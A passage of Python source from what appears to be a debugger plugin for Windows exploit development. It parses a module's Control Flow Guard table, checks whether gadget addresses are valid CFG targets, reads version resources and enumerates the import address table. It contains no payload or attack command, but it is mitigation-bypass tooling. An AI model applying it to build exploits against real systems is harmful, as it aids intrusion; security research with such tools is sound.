		self.moduleDllCharacteristics = mdllcharacteristics

		self.moduleSEHTable = msehtable

		self.moduleSEHCount = msehcount

		self.modulePdbName = mpdbname

		self.modulePdbGuidAge = mpdbguidage

		self.moduleCFGTable = MnModule.CFGTable(self.moduleBase)


	def getCFGTable(self):

		global CFGTableCache
		module_key = self.moduleKey or self.internalname
		if module_key in CFGTableCache:
			self.moduleCFGTable = CFGTableCache[module_key]
			dbgp("Returning CFG Table for %s from cache" % module_key)
			return self.moduleCFGTable

		dbgp("Creating CFG Table for %s from memory" % module_key)
		
		cfg_table = self.moduleCFGTable
		cfg_table.reset(self.moduleBase)

		def parse_cfg_flags(flag_byte):
			flags = []

			if flag_byte & IMAGE_GUARD_FLAG_FID_SUPPRESSED:
				flags.append("FID_SUPPRESSED")

			if flag_byte & IMAGE_GUARD_FLAG_EXPORT_SUPPRESSED:
				flags.append("EXPORT_SUPPRESSED")

			if flag_byte & IMAGE_GUARD_FLAG_FID_LANGEXCPTHANDLER:
				flags.append("LANGEXCPTHANDLER")

			if flag_byte & IMAGE_GUARD_FLAG_FID_XFG:
				flags.append("XFG")

			if not flags:
				flags.append("-")

			return flags

		def _u32(data):
			return struct.unpack("<I", _to_bytes(data[:4]))[0]

		# CFG detail — parse IMAGE_LOAD_CONFIG_DIRECTORY from memory
		GUARD_FLAGS = [
			(0x00000100, "CF_INSTRUMENTED",              "module performs CF checks"),
			(0x00000200, "CFW_INSTRUMENTED",             "module performs CF + write checks"),
			(0x00000400, "CF_FUNCTION_TABLE_PRESENT",    "guard function table present"),
			(0x00000800, "SECURITY_COOKIE_UNUSED",       "security cookie not used by CF"),
			(0x00001000, "PROTECT_DELAYLOAD_IAT",        "delay-load IAT protected"),
			(0x00002000, "DELAYLOAD_IAT_IN_OWN_SECTION", "delay-load IAT in its own section"),
			(0x00004000, "CF_EXPORT_SUPPRESSION_PRESENT","export suppression info present"),
			(0x00008000, "CF_ENABLE_EXPORT_SUPPRESSION", "export suppression enabled"),
			(0x00010000, "CF_LONGJUMP_TABLE_PRESENT",    "longjmp targets table present"),
			(0x00020000, "RF_INSTRUMENTED",              "retpoline instrumented"),
			(0x00040000, "RF_ENABLE",                    "retpoline enabled"),
			(0x00080000, "RF_STRICT",                    "retpoline strict mode"),
			(0x00100000, "RETPOLINE_PRESENT",            "retpoline present"),
			(0x00200000, "EH_CONTINUATION_TABLE_PRESENT","EH continuation table present"),
			(0x00800000, "XFG_ENABLED",                  "eXtended Flow Guard (XFG) enabled"),
			(0x01000000, "CASTGUARD_PRESENT",            "CastGuard present"),
			(0x02000000, "MEMKM_PRESENT",                "MemKM present"),
		]

		IMAGE_GUARD_CF_FUNCTION_TABLE_SIZE_MASK  = 0xF0000000
		IMAGE_GUARD_CF_FUNCTION_TABLE_SIZE_SHIFT = 28

		IMAGE_GUARD_FLAG_FID_SUPPRESSED          = 0x01
		IMAGE_GUARD_FLAG_EXPORT_SUPPRESSED       = 0x02
		IMAGE_GUARD_FLAG_FID_LANGEXCPTHANDLER    = 0x04
		IMAGE_GUARD_FLAG_FID_XFG                 = 0x08

		try:
			pe_off2   = struct.unpack('<L', dbg.readMemory(self.moduleBase + 0x3c, 4))[0]
			pe_base2  = self.moduleBase + pe_off2
			magic2    = struct.unpack('<H', dbg.readMemory(pe_base2 + 0x18, 2))[0]
			is_pe64_2 = (magic2 == 0x20b)
			# IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG = 10
			if is_pe64_2:
				dd_off2 = pe_base2 + 0x18 + 0x70   # PE32+ optional header DataDirectory
			else:
				dd_off2 = pe_base2 + 0x18 + 0x60   # PE32 optional header DataDirectory
			lc_rva2  = struct.unpack('<L', dbg.readMemory(dd_off2 + 8 * 10,     4))[0]
			lc_size2 = struct.unpack('<L', dbg.readMemory(dd_off2 + 8 * 10 + 4, 4))[0]
			if lc_rva2 and lc_size2:
				lc = self.moduleBase + lc_rva2
				# Read the struct's own Size DWORD (first field) — more reliable than DataDirectory size
				lc_struct_size = struct.unpack('<L', dbg.readMemory(lc, 4))[0]
				if is_pe64_2:
					# IMAGE_LOAD_CONFIG_DIRECTORY64 offsets
					# SEHandlerTable/Count occupy lc+0x60 and lc+0x68.
					# GuardFlags sit at lc+0x90, so the last CFG field ends at lc+0x94.
					min_cfg_size = 0x94
					if lc_struct_size >= min_cfg_size:
						cfg_check_fp   = struct.unpack('<Q', dbg.readMemory(lc + 0x70, 8))[0]
						cfg_dispatch_fp= struct.unpack('<Q', dbg.readMemory(lc + 0x78, 8))[0]
						cfg_table_va   = struct.unpack('<Q', dbg.readMemory(lc + 0x80, 8))[0]
						cfg_count      = struct.unpack('<Q', dbg.readMemory(lc + 0x88, 8))[0]
						guard_flags    = struct.unpack('<L', dbg.readMemory(lc + 0x90, 4))[0]
					else:
						cfg_check_fp = cfg_dispatch_fp = cfg_table_va = cfg_count = guard_flags = None
				else:
					# IMAGE_LOAD_CONFIG_DIRECTORY32 offsets
					# GuardCFFunctionCount is DWORD (not ULONGLONG) in 32-bit struct
					# GuardFlags at lc+0x58, last CFG field ends at lc+0x5c
					min_cfg_size = 0x5c
					if lc_struct_size >= min_cfg_size:
						cfg_check_fp   = struct.unpack('<L', dbg.readMemory(lc + 0x48, 4))[0]
						cfg_dispatch_fp= struct.unpack('<L', dbg.readMemory(lc + 0x4c, 4))[0]
						cfg_table_va   = struct.unpack('<L', dbg.readMemory(lc + 0x50, 4))[0]
						cfg_count      = struct.unpack('<L', dbg.readMemory(lc + 0x54, 4))[0]
						guard_flags    = struct.unpack('<L', dbg.readMemory(lc + 0x58, 4))[0]
					else:
						cfg_check_fp = cfg_dispatch_fp = cfg_table_va = cfg_count = guard_flags = None
				if not guard_flags is None:
					set_gflags = [(bit, name, desc) for bit, name, desc in GUARD_FLAGS if guard_flags & bit]
					cfg_table.cfg_check_fp = cfg_check_fp or 0
					cfg_table.cfg_dispatch_fp = cfg_dispatch_fp or 0
					cfg_table.cfg_table_va = cfg_table_va or 0
					cfg_table.cfg_count = cfg_count or 0
					cfg_table.guard_flags = guard_flags or 0
					cfg_table.guard_flag_names = [name for bit, name, desc in set_gflags]
					dbgp("   GuardFlags       : 0x%08x" % guard_flags)
					for bit, name, desc in set_gflags:
						dbgp("     [+] %-40s %s" % (name, desc))
					if cfg_count:
						if arch == 64:
							dbgp("   CFG table        : 0x%016x  (%d entries)" % (cfg_table_va, cfg_count))
							dbgp("   CF check fptr    : 0x%016x" % cfg_check_fp)
							dbgp("   CF dispatch fptr : 0x%016x" % cfg_dispatch_fp)
						else:
							dbgp("   CFG table        : 0x%08x  (%d entries)" % (cfg_table_va, cfg_count))
							dbgp("   CF check fptr    : 0x%08x" % cfg_check_fp)
							dbgp("   CF dispatch fptr : 0x%08x" % cfg_dispatch_fp)

						# read the entires in the table
						extra_size = (guard_flags & IMAGE_GUARD_CF_FUNCTION_TABLE_SIZE_MASK) >> IMAGE_GUARD_CF_FUNCTION_TABLE_SIZE_SHIFT
						entry_size = 4 + extra_size

						if entry_size < 4:
							entry_size = 4

						cfg_table.extra_size = extra_size
						cfg_table.entry_size = entry_size

						total_size = cfg_count * entry_size
						content = dbg.readMemory(cfg_table_va, total_size)
						content = _to_bytes(content)

						dbgp("CFG Table content: %d bytes" % len(content))

						#print("[+] CFG function table")
						#print("    Table VA    : 0x%08x" % cfg_table_va)
						#print("    Image base  : 0x%08x" % self.moduleBase)
						#print("    Entries     : %d" % cfg_count)
						#print("    Entry size  : %d" % entry_size)
						#print("")

						for i in range(cfg_count):
							off = i * entry_size
							entry = content[off:off + entry_size]
							#dbgp("  %s" % bin2hex(entry))

							if len(entry) < 4:
								break

							rva = _u32(entry)
							va = self.moduleBase + rva

							flag_byte = 0
							flags = ["-"]

							if entry_size > 4 and len(entry) > 4:
								flag_byte = struct.unpack("B", _to_bytes(entry[4:5]))[0]
								flags = parse_cfg_flags(flag_byte)

							cfg_table.add_entry(rva, flag_byte, flags)

					CFGTableCache[module_key] = cfg_table
					dbgp("Added CFGTable to cache for module %s" % module_key)
					return cfg_table
				
				CFGTableCache[module_key] = cfg_table
			return cfg_table

		except Exception as e:
			dbgp("Error - unable to get CFG Table for module %s: %s" % (module_key, str(e)), errormode=False)
			CFGTableCache[module_key] = cfg_table
			return cfg_table


	def checkCFGCompatible(self, ptr, granularity=16, return_entry=False, return_reason=False):
		"""
		Check whether ptr is likely CFG-compatible for this module.

		ptr:
			Address of the gadget / target you want to test.

		granularity:
			CFG bitmap granularity. 16 is the practical default.

		return_entry:
			If True, return (bool, matching_entry).
			If False, return bool.

		return_reason:
			If True, include a short explanation describing why the address
			was or was not considered CFG-compatible.

		Important:
			This is a static approximation based on the GuardCFFunctionTable.
			Runtime CFG uses a bitmap, so addresses in the same bitmap slot as a
			valid CFG target may pass, even if they are not exact table entries.
		"""

		def _ret(is_compatible, entry=None, reason=""):
			if return_entry and return_reason:
				return (is_compatible, entry, reason)
			if return_entry:
				return (is_compatible, entry)
			if return_reason:
				return (is_compatible, reason)
			return is_compatible

		if not ptr:
			return _ret(False, None, "Address is null or zero.")

		cfg_table = self.moduleCFGTable
		if not cfg_table or not cfg_table.entries:
			cfg_table = self.getCFGTable()

		if not cfg_table or not cfg_table.entries:
			return _ret(False, None, "Module has no cached CFG entries.")

		module_base = self.moduleBase or cfg_table.module_base
		cfg_bucket_hits = cfg_table.get_bucket_hits(granularity)
		cfg_first_entries = cfg_table.get_bucket_first_entries(granularity)
		cfg_compat_cache = cfg_table.get_compat_cache(granularity)

		def _bucket_bounds(bucket):
			start = bucket * granularity
			end = start + granularity - 1
			return start, end

		def _miss_reason(bucket):
			if not return_reason:
				return ""

			sorted_buckets = cfg_table.get_sorted_buckets(granularity)
			if not sorted_buckets:
				return "The module does not seem to have valid CFG buckets."

			idx = bisect.bisect_left(sorted_buckets, bucket)
			prev_txt = "none"
			next_txt = "none"

			if idx > 0:
				prev_bucket = sorted_buckets[idx - 1]
				prev_start, prev_end = _bucket_bounds(prev_bucket)
				prev_distance = (bucket - prev_bucket) * granularity
				prev_txt = "0x%x [0x%x-0x%x], distance %d byte(s)" % (prev_bucket, prev_start, prev_end, prev_distance)

			if idx < len(sorted_buckets):
				next_bucket = sorted_buckets[idx]
				next_start, next_end = _bucket_bounds(next_bucket)
				next_distance = (next_bucket - bucket) * granularity
				next_txt = "0x%x [0x%x-0x%x], distance %d byte(s)" % (next_bucket, next_start, next_end, next_distance)

			#return "Address falls in bucket index 0x%x, which is not present in the module CFG table.\nNearest previous valid bucket: %s.\nNearest next valid bucket: %s." % (bucket, prev_txt, next_txt)
			return "Address is not part of a valid CFG target range. \nNearest previous valid bucket: %s.\nNearest next valid bucket: %s." % (prev_txt, next_txt)

		# Normalize ptr to VA.
		# If ptr looks like an RVA, convert it to VA.
		if module_base and ptr < module_base:
			ptr_va = module_base + ptr
		else:
			ptr_va = ptr

		ptr_bucket = ptr_va // granularity
		if ptr_bucket in cfg_compat_cache:
			cached_entry = cfg_compat_cache[ptr_bucket]
			if cached_entry is False:
				return _ret(False, None, _miss_reason(ptr_bucket))
			bucket_start, bucket_end = _bucket_bounds(ptr_bucket)
			return _ret(True, cached_entry, "Address is in CFG target range [%s-%s],\nmatching CFG entry RVA %s (VA %s).\n(cached)" % (PTR_PRINT % bucket_start, PTR_PRINT % bucket_end, PTR_PRINT % cached_entry.rva, PTR_PRINT % cached_entry.va))

		if ptr_bucket in cfg_bucket_hits:
			entry = cfg_first_entries.get(ptr_bucket)
			cfg_compat_cache[ptr_bucket] = entry
			bucket_start, bucket_end = _bucket_bounds(ptr_bucket)
			return _ret(True, entry, "Address is in CFG target range [%s-%s],\nmatching CFG entry RVA %x (VA %s)." % (PTR_PRINT % bucket_start, PTR_PRINT % bucket_end, PTR_PRINT % (entry.rva if entry else 0), PTR_PRINT % (entry.va if entry else 0)))

		cfg_compat_cache[ptr_bucket] = False

		return _ret(False, None, _miss_reason(ptr_bucket))



	# ------------------------------------------------------------------
	# VS_VERSIONINFO parsing — inlined from windbglib so MnModule has
	# no dbglib dependency for OS-module detection.
	# ------------------------------------------------------------------



	class _FixedFileInfo:
		"""Mirrors VS_FIXEDFILEINFO (winver.h). Signature must be 0xFEEF04BD."""
		SIGNATURE = 0xFEEF04BD

		def __init__(self, data, offset):
			(self.dw_signature, dw_struc_version,
			 dw_file_version_ms, dw_file_version_ls,
			 dw_product_version_ms, dw_product_version_ls,
			 self.dw_file_flags_mask, self.dw_file_flags,
			 self.dw_file_os, self.dw_file_type, self.dw_file_subtype,
			 self.dw_file_date_ms, self.dw_file_date_ls) = struct.unpack_from("<13I", data, offset)
			if self.dw_signature != self.SIGNATURE:
				raise ValueError("Invalid VS_FIXEDFILEINFO signature: %s" % hex(self.dw_signature))
			self.file_version = (dw_file_version_ms >> 16, dw_file_version_ms & 0xFFFF,
			                     dw_file_version_ls >> 16, dw_file_version_ls & 0xFFFF)

		@property
		def file_version_str(self):
			return "%d.%d.%d.%d" % self.file_version


	class _StringTable:
		"""One language/codepage block inside StringFileInfo."""
		def __init__(self, lang_id, strings):
			self.lang_id = lang_id
			self.strings = strings

		def get(self, key, default=None):
			return self.strings.get(key, default)


	class VSVersionInfo:
		"""
		Parse a VS_VERSION_INFO resource blob.
		Use from_memory(modbase) or from_file(path) to construct.
		"""

		@staticmethod
		def _align4(n):
			return (n + 3) & ~3

		def __init__(self, data):
			self._data = data
			self._parse()

		def _read_node_header(self, offset):
			w_length, w_value_length, w_type = struct.unpack_from("<HHH", self._data, offset)
			pos = offset + 6
			end = pos
			while end + 1 < len(self._data) and self._data[end:end + 2] != b'\x00\x00':
				end += 2
			key = self._data[pos:end].decode('utf-16-le')
			value_start = self._align4(end + 2)
			return w_length, w_value_length, w_type, key, value_start

		def _parse(self):
			data = self._data
			self.w_length, self.w_value_length, self.w_type, _, pos = self._read_node_header(0)
			self.fixed = MnModule._FixedFileInfo(data, pos)
			self.string_tables = []
			pos = self._align4(pos + self.w_value_length)
			root_end = self.w_length
			while pos < root_end:
				c_length, _, _, c_key, c_pos = self._read_node_header(pos)
				if c_length == 0:
					break
				if c_key == 'StringFileInfo':
					st_pos = c_pos
					st_end = pos + c_length
					while st_pos < st_end:
						st_length, _, _, lang_key, s_pos = self._read_node_header(st_pos)
						if st_length == 0:
							break
						strings = {}
						s_end = st_pos + st_length
						while s_pos < s_end:
							s_length, s_value_length, _, s_key, s_val_pos = self._read_node_header(s_pos)
							if s_length == 0:
								break
							raw = data[s_val_pos:s_val_pos + s_value_length * 2]
							strings[s_key] = raw.decode('utf-16-le').rstrip('\x00')
							s_pos = self._align4(s_pos + s_length)
						self.string_tables.append(MnModule._StringTable(lang_key, strings))
						st_pos = self._align4(st_pos + st_length)
				pos = self._align4(pos + c_length)

		@classmethod
		def from_memory(cls, modbase):
			"""Parse VS_VERSION_INFO from the loaded module in debuggee memory."""
			def _read(addr, size):
				return bytes(bytearray(dbg.readMemory(addr, size)))
			def _dword(addr): return struct.unpack("<I", _read(addr, 4))[0]
			def _word(addr):  return struct.unpack("<H", _read(addr, 2))[0]

			nt_off = _dword(modbase + 0x3C)
			nt_base = modbase + nt_off
			if _read(nt_base, 4) != b"PE\x00\x00":
				raise ValueError("Not a valid PE in memory at 0x%x" % modbase)
			num_sections = _word(nt_base + 6)
			size_opt_hdr = _word(nt_base + 20)
			magic = _word(nt_base + 24)
			if magic == 0x10b:
				dd_off = nt_base + 24 + 96
			elif magic == 0x20b:
				dd_off = nt_base + 24 + 112
			else:
				raise ValueError("Unknown Optional Header magic: %s" % hex(magic))
			res_rva  = _dword(dd_off + 2 * 8)
			if res_rva == 0:
				raise ValueError("No resource directory")
			sect_base = nt_base + 4 + 20 + size_opt_hdr
			res_sec = None
			for i in range(num_sections):
				sd = _read(sect_base + i * 40, 40)
				v_sz, v_addr = struct.unpack_from("<II", sd, 8)
				if v_addr <= res_rva < v_addr + v_sz:
					res_sec = (v_addr, modbase + v_addr)
					break
			if res_sec is None:
				raise ValueError("Resource section not found")
			_, sec_va = res_sec

			def read_dir_entries(dir_va):
				hdr = _read(dir_va, 16)
				num_named, num_id = struct.unpack("<HH", hdr[12:16])
				raw = _read(dir_va + 16, (num_named + num_id) * 8)
				return [struct.unpack_from("<II", raw, i * 8) for i in range(num_named + num_id)]

			res_va = modbase + res_rva
			RT_VERSION = 16
			type_off = next((off for id_, off in read_dir_entries(res_va)
			                 if not (id_ & 0x80000000) and id_ == RT_VERSION), None)
			if type_off is None:
				raise ValueError("RT_VERSION not found")
			name_entries = read_dir_entries(res_va + (type_off & 0x7FFFFFFF))
			if not name_entries: raise ValueError("RT_VERSION: no name entries")
			_, lang_off = name_entries[0]
			lang_entries = read_dir_entries(res_va + (lang_off & 0x7FFFFFFF))
			if not lang_entries: raise ValueError("RT_VERSION: no language entries")
			_, data_entry_off = lang_entries[0]
			data_entry = _read(res_va + data_entry_off, 8)
			data_rva, data_size = struct.unpack("<II", data_entry)
			data = _read(modbase + data_rva, data_size)
			return cls(data)

		@classmethod
		def from_file(cls, path):
			"""Parse VS_VERSION_INFO from a PE file on disk."""
			with open(path, 'rb') as f:
				data = f.read()
			if len(data) < 0x40:
				raise ValueError("File too small")
			nt_off = struct.unpack("<I", data[0x3C:0x40])[0]
			if data[nt_off:nt_off + 4] != b"PE\x00\x00":
				raise ValueError("Not a valid PE file")
			magic = struct.unpack("<H", data[nt_off + 0x18:nt_off + 0x1a])[0]
			if magic == 0x10b:
				dd_off = nt_off + 0x18 + 0x60
			elif magic == 0x20b:
				dd_off = nt_off + 0x18 + 0x70
			else:
				raise ValueError("Unknown Optional Header magic")
			res_rva, _ = struct.unpack("<II", data[dd_off + 2 * 8:dd_off + 2 * 8 + 8])
			if res_rva == 0:
				raise ValueError("No resource directory")
			num_sections = struct.unpack("<H", data[nt_off + 6:nt_off + 8])[0]
			opt_hdr_size = struct.unpack("<H", data[nt_off + 0x14:nt_off + 0x16])[0]
			secs_off = nt_off + 0x18 + opt_hdr_size
			res_sec = None
			for i in range(num_sections):
				sec = secs_off + i * 40
				v_addr, v_sz = struct.unpack("<II", data[sec + 12:sec + 20])
				raw_ptr       = struct.unpack("<I",  data[sec + 20:sec + 24])[0]
				if v_addr <= res_rva < v_addr + v_sz:
					res_sec = (v_addr, raw_ptr)
					break
			if res_sec is None:
				raise ValueError("Resource section not found")
			sec_va, sec_raw = res_sec

			def rva2off(rva):
				return rva - sec_va + sec_raw

			def read_dir_entries(dir_rva):
				off = rva2off(dir_rva)
				num_named, num_id = struct.unpack("<HH", data[off + 12:off + 16])
				count = num_named + num_id
				return [struct.unpack_from("<II", data, off + 16 + i * 8) for i in range(count)]

			RT_VERSION = 16
			type_off = next((off for id_, off in read_dir_entries(res_rva)
			                 if not (id_ & 0x80000000) and id_ == RT_VERSION), None)
			if type_off is None:
				raise ValueError("RT_VERSION not found")
			name_entries = read_dir_entries(res_rva + (type_off & 0x7FFFFFFF))
			if not name_entries: raise ValueError("RT_VERSION: no name entries")
			_, lang_off = name_entries[0]
			lang_entries = read_dir_entries(res_rva + (lang_off & 0x7FFFFFFF))
			if not lang_entries: raise ValueError("RT_VERSION: no language entries")
			_, data_entry_off = lang_entries[0]
			data_rva, data_size = struct.unpack("<II", data[rva2off(res_rva + data_entry_off):rva2off(res_rva + data_entry_off) + 8])
			blob = data[rva2off(data_rva):rva2off(data_rva) + data_size]
			return cls(blob)

	# ------------------------------------------------------------------

	def __str__(self, clickable=False):
		#return general info about the module
		#modulename + info
		"""
		Get information about a module (human readable format)

		Arguments:
		None

		Return:
		String with various properties about a module
		"""			
		outstring = ""
		if self.moduleKey != "":
			modname = self.moduleKey
			if clickable:
				modname = clickModuleName(modname)
			if arch == 32:
				outstring = "[" + modname + "] ASLR: " + str(self.isAslr) + ", Rebase: " + str(self.isRebase) + ", SafeSEH: " + str(self.isSafeSEH) + ", CFG: " + str(self.isCFG) +  ", OS: " + str(self.isOS) + ", v" + self.moduleVersion + " (" + self.modulePath + "), 0x%x" % self.moduleDllCharacteristics 
			else:
				dbgp("Module %s" % self.moduleKey)
				dbgp(" ModuleCharacteristics: 0x%x" % self.moduleDllCharacteristics)
				dbgp(" Version: %s" % self.moduleVersion)
				outstring = "[" + modname+ "] ASLR: " + str(self.isAslr) + ", Rebase: " + str(self.isRebase) +  ", CFG: " + str(self.isCFG) +  ", OS: " + str(self.isOS) + ", v" + self.moduleVersion + " (" + self.modulePath + "), 0x%x" % self.moduleDllCharacteristics 
		else:
			outstring = "[None]"
		return outstring
		
	def isAslr(self):
		return self.isAslr
		
	def isSafeSEH(self):
		return self.isSafeSEH
		
	def isRebase(self):
		return self.isRebase
		
	def isOS(self):
		return self.isOS

	def isCFG(self):
		return self.isCFG
	
	def isNX(self):
		return self.isNX
		
	def moduleKey(self):
		return self.moduleKey
		
	def modulePath(self):
		return self.modulePath

	def moduleFilename(self):
		return self.moduleFilename

	def moduleBase(self):
		return self.moduleBase
	
	def moduleSize(self):
		return self.moduleSize
	
	def moduleTop(self):
		return self.moduleTop
	
	def moduleEntry(self):
		return self.moduleEntry
		
	def moduleCodebase(self):
		return self.moduleCodebase
	
	def moduleCodesize(self):
		return self.moduleCodesize
		
	def moduleCodetop(self):
		return self.moduleCodetop
		
	def moduleVersion(self):
		return self.moduleVersion

	def moduleDllCharacteristics(self):
		return self.moduleDllCharacteristics
		
	def isExcluded(self):
		return self.isExcluded
	
	def getFunctionCalls(self,criteria={}):
		funccalls = {}
		sequences = []
		sequences.append(["call","\xff\x15"])
		funccalls = searchInRange(sequences, self.moduleBase, self.moduleTop,criteria)
		return funccalls

		
	def getIAT(self):
		IAT = {}
		#dbg.log("")
		dbgp(get_current_function_name())
		dbgp("    Getting IAT for %s." % (self.moduleKey))
		try:
			if not self.moduleKey in mnproc.IATCache:  # if len(self.IAT) == 0:
				
				# METHOD 1 - Parse the strings from the IAT.  Fastest way
				dbg.log("      Enumerating IAT, method 1 (Read IAT from memory)") 
				# find optional header
				PEHeader_ref = self.moduleBase + 0x3c
				PEHeader_location = self.moduleBase + struct.unpack('<L', dbg.readMemory(PEHeader_ref, 4))[0]

				# do we have an optional header ?
				bsizeOfOptionalHeader = dbg.readMemory(PEHeader_location + 0x14, 2)
				sizeOfOptionalHeader = struct.unpack('<L', bsizeOfOptionalHeader + b"\x00\x00")[0]
				OptionalHeader_location = PEHeader_location + 0x18

				if sizeOfOptionalHeader > 0:

					# PE32 vs PE32+
					optional_magic = struct.unpack('<H', dbg.readMemory(OptionalHeader_location, 2))[0]

					if optional_magic == 0x10b:
						# PE32
						DataDirectory_location = OptionalHeader_location + 0x60
						thunk_size = 4
						thunk_fmt = '<L'
						ordinal_flag = 0x80000000
					elif optional_magic == 0x20b:
						# PE32+
						DataDirectory_location = OptionalHeader_location + 0x70
						thunk_size = 8
						thunk_fmt = '<Q'
						ordinal_flag = 0x8000000000000000
					else:
						DataDirectory_location = 0
						thunk_size = 0

					if DataDirectory_location > 0:

						# Import Directory = DataDirectory[1]
						importtable_rva  = struct.unpack('<L', dbg.readMemory(DataDirectory_location + 0x08, 4))[0]
						importtable_size = struct.unpack('<L', dbg.readMemory(DataDirectory_location + 0x0c, 4))[0]

						if importtable_rva > 0 and importtable_size > 0:
							importDescAddr = self.moduleBase + importtable_rva
							dbgp("      Import table at 0x%08x, size 0x%08x" % (importDescAddr, importtable_size))

							desc_index = 0
							while True:
								thisdesc = importDescAddr + (desc_index * 20)

								orig_first_thunk = struct.unpack('<L', dbg.readMemory(thisdesc + 0x00, 4))[0]
								time_date_stamp  = struct.unpack('<L', dbg.readMemory(thisdesc + 0x04, 4))[0]
								forwarder_chain  = struct.unpack('<L', dbg.readMemory(thisdesc + 0x08, 4))[0]
								name_rva         = struct.unpack('<L', dbg.readMemory(thisdesc + 0x0c, 4))[0]
								first_thunk      = struct.unpack('<L', dbg.readMemory(thisdesc + 0x10, 4))[0]

								# null descriptor = end
								if orig_first_thunk == 0 and time_date_stamp == 0 and forwarder_chain == 0 and name_rva == 0 and first_thunk == 0:
									break

								if name_rva == 0 or first_thunk == 0:
									desc_index += 1
									continue

								dllname = dbg.readString(self.moduleBase + name_rva)
								if dllname is None:
									dllname = ""
								dllname = ensure_text(dllname).lower()

								lookup_rva = orig_first_thunk
								if lookup_rva == 0:
									lookup_rva = first_thunk

								lookup_va = self.moduleBase + lookup_rva
								iat_va = self.moduleBase + first_thunk

								dbgp("      Import descriptor for %s" % dllname)
								dbgp("        lookup_va : 0x%x" % lookup_va)
								dbgp("        iat_va    : 0x%x" % iat_va)

								thunk_index = 0
								while True:
									thunk_entry_va = lookup_va + (thunk_index * thunk_size)
									iat_entry_va = iat_va + (thunk_index * thunk_size)

									thunk_data = dbg.readMemory(thunk_entry_va, thunk_size)
									if len(thunk_data) != thunk_size:
										break

									thunk_value = struct.unpack(thunk_fmt, thunk_data)[0]
									if thunk_value == 0:
										break

									funcname = ""

									# import by ordinal
									if (thunk_value & ordinal_flag) != 0:
										ordinal = thunk_value & 0xffff
										funcname = "%s!#%d" % (stripExtension(dllname), ordinal)
									else:
										# IMAGE_IMPORT_BY_NAME = WORD Hint + ASCII name
										import_by_name_va = self.moduleBase + thunk_value
										try:
											name = dbg.readString(import_by_name_va + 2)
										except:
											name = ""

										name = ensure_text(name)
										if name.strip() != "":
											funcname = "%s!%s" % (stripExtension(dllname), name)

									# fallback: resolve current IAT contents through symbols/EAT
									if funcname == "":
										try:
											current_iat_target = struct.unpack(thunk_fmt, dbg.readMemory(iat_entry_va, thunk_size))[0]
										except:
											current_iat_target = 0

										if current_iat_target > 0:
											tmod = mnproc.getModuleForAddress(current_iat_target)
											thisfunc = dbglib.Function(dbg, current_iat_target)
											thisfuncfullname = ensure_text(thisfunc.getName()).lower()

											if thisfuncfullname.endswith(".unknown") or thisfuncfullname.endswith(".%08x" % current_iat_target):
												if tmod is not None:
													imagename = tmod.getShortName()
													eatlist = tmod.getEAT()
													if current_iat_target in eatlist:
														funcname = imagename + "!" + eatlist[current_iat_target]
													else:
														if arch == 32:
															funcname = imagename + "!0x%08x" % current_iat_target
														else:
															funcname = imagename + "!0x%016x" % current_iat_target
											else:
												funcname = thisfuncfullname.replace(".", "!")

									if funcname != "":
										IAT[iat_entry_va] = funcname
										dbgp("      Update IAT[0x%x] to %s" % (iat_entry_va, IAT[iat_entry_va]))

									thunk_index += 1

								desc_index += 1
				dbg.log("      Extracted %d entries from IAT" % len(IAT))
				dbgp("      -> We have extracted %d names from the IAT of %s" % (len(IAT), self.moduleKey))

				# METHOD 2 - Fallback in case we did not get a lot of strings.
				# Let's say less than 10

				if len(IAT) < 10:
					before_method2_cnt = len(IAT)
					dbg.log("      Enumerating IAT, method 2 (Symbols - this might take a while)") 
					# this may not work well on Immunity.  Module.getSymbols() may not return anything         
					try:
						themod = dbg.getModule(self.moduleKey)
						syms = themod.getSymbols()
						thename = ""
						dbg.log("      %d symbols found, now filtering relevant entries" % len(syms))
						dbgp("      %d symbols found for %s" % (len(syms), self.moduleKey))
						for sym in syms:
							#dbg.log("   - symbol: %s" % sym)
							if syms[sym].getType().startswith("Import"):
								thename = syms[sym].getName()
								theaddress = syms[sym].getAddress()
								#if not theaddress in IAT:
								#just overwrite it if it exists
								IAT[theaddress] = thename
					except Exception as e:
						dbg.log(str(e))
						import traceback
						dbg.logLines(traceback.format_exc())
						pass
					# merge
					dbgp("      -> We added %d additional names using method 2" % (len(IAT) - before_method2_cnt))


				if len(IAT) == 0:
					# another search method, not accurate, but might find *something*
					dbg.log("      Enumerating IAT, method 3 (getFunctionCalls)")
					funccalls = self.getFunctionCalls()
					_eat_cache = {}

					for functype in funccalls:
						for fptr in funccalls[functype]:

							ptr = 0

							try:
								# x86: FF 15 <addr32>  => absolute memory operand
								if arch == 32:
									rawptr = dbg.readMemory(fptr + 2, 4)
									if len(rawptr) != 4:
										continue
									ptr = struct.unpack('<L', rawptr)[0]

								# x64: FF 15 <disp32> => CALL QWORD PTR [RIP+disp32]
								elif arch == 64:
									rawdisp = dbg.readMemory(fptr + 2, 4)
									if len(rawdisp) != 4:
										continue
									disp = struct.unpack('<l', rawdisp)[0]
									ptr = fptr + 6 + disp

							except:
								continue

							if ptr <= 0:
								continue

							# keep old behavior: only consider references that point inside this module
							if ptr >= self.moduleBase and ptr <= self.moduleTop:
								if not ptr in IAT:
									thisfuncfullname = ""
									thisfuncname = []

									try:
										thisfunc = dbglib.Function(dbg, ptr)
										thisfuncfullname = ensure_text(thisfunc.getName()).lower()
									except:
										thisfuncfullname = ""

									unknownmatch = False
									if arch == 32:
										unknownmatch = thisfuncfullname.endswith(".unknown") or thisfuncfullname.endswith(".%08x" % ptr)
									else:
										unknownmatch = thisfuncfullname.endswith(".unknown") or thisfuncfullname.endswith(".%016x" % ptr)

									if unknownmatch or thisfuncfullname == "":
										try:
											if arch == 32:
												raw_iat_target = dbg.readMemory(ptr, 4)
												if len(raw_iat_target) != 4:
													iatptr = 0
												else:
													iatptr = struct.unpack('<L', raw_iat_target)[0]
											else:
												raw_iat_target = dbg.readMemory(ptr, 8)
												if len(raw_iat_target) != 8:
													iatptr = 0
												else:
													iatptr = struct.unpack('<Q', raw_iat_target)[0]
										except:
											iatptr = 0

										# see if we can find the original function name using the EAT
										tmod = mnproc.getModuleForAddress(iatptr) if iatptr > 0 else None
										ofullname = thisfuncfullname

										if tmod is not None:
											imagename = tmod.getShortName()
											if imagename not in _eat_cache:
												_eat_cache[imagename] = tmod.getEAT()
											eatlist = _eat_cache[imagename]
											if iatptr in eatlist:
												thisfuncfullname = "." + imagename + "!" + eatlist[iatptr]

										if thisfuncfullname == ofullname or thisfuncfullname == "":
											tparts = thisfuncfullname.split('!')
											if len(tparts) > 0 and tparts[0] != "":
												if arch == 32:
